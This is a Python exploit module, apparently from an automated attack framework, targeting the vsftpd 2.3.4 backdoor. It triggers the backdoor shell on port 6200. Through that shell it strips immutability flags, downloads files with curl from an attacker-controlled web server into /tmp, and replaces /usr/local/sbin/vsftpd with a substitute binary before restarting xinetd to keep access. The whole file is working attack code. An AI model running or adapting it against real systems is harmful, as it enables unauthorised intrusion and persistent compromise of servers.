#!/usr/bin/python3

from .base import Module
import socket
import time
from pwnlib.tubes.remote import remote
from pwnlib.tubes.listen import listen
from pwnlib.exception import PwnlibException
from ..payloads.basicpayload import BasicPayload
from ..utils.encoding import hex_reprb
from ..utils import common
import random


class VSFTPdBackdoor(Module):
    """Exploits the vsftpd 2.3.4 backdoor (Primary Module)"""

    payload = BasicPayload() # No payload required

    def detect(self, target):
        """Detect a small change in the banner signifying compromise

           Also detect if there was already a shell running, if so close it.
        """
        try:
            s = remote(target['ip'], 21, timeout=0.25)
            banner = s.recvuntil("220 \r\n")

            if banner[-3] == b"-" :
                return None

            return s
        except:
            return None

    def compromise(self, target, detect_val):
        """Perform the exploitation"""

        # detect_val should be socket we used to test for compromise
        # Saves an open socket

        try:
            detect_val.sendline(b"USER anonymous:)")
            detect_val.recvline()
            detect_val.sendline(b"PASS ")
            detect_val.close()

            time.sleep(0.25)
            s = remote(target['ip'], 6200, timeout=0.25)

            for i in self.payload.files.keys():
                self.drop_file(s, i, payload.files[i])

            for i in self.payload.steps():
                s.sendline(i)

            self.drop_file(s, "vsftpd.lol",
                           "/usr/local/sbin/vsftpd")
            s.sendline("chmod 755 /usr/local/sbin/vsftpd")
            s.sendline("service xinetd restart")

            s.close()
        except PwnlibException:
            print("vsftpd patched")
        except:
            import traceback
            traceback.print_exc()

        return True

    def drop_file(self, sock, fl, location):
        """Drops files using webserver. Paths are relative to resources"""
        send_port = common.http_port
        send_host = common.host_ip
        sock.sendline("chattr -i %s" % location)
        sock.sendline("chmod +w %s" % location)
        rand = random.randrange(1000000)
        sock.sendline("curl http://%s:%d/%s > /tmp/tmp.%s" % (send_host,
                                                              send_port,
                                                              fl, rand))
        sock.sendline("mv -f /tmp/tmp.%s %s" % (rand, location))
